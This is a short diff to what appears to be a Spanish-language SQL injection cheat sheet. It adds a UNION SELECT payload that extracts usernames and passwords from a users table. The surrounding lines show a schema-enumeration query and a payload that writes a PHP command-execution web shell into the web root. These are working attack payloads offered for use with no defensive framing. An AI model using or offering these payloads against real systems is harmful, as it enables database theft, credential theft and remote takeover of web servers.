@@ -51,7 +51,8 @@ select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS whe
 ## web shell:
 select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 
-
+##unir varios valores en un mismo resultado:
+' UNION SELECT username || '~' || password FROM users--
 
 ################## Modificar una tabla(nombre, campos, agregar o eliminar una columna)
 ALTER TABLE <tabla> ADD <nombre_columna> <tipo_de_valor>;
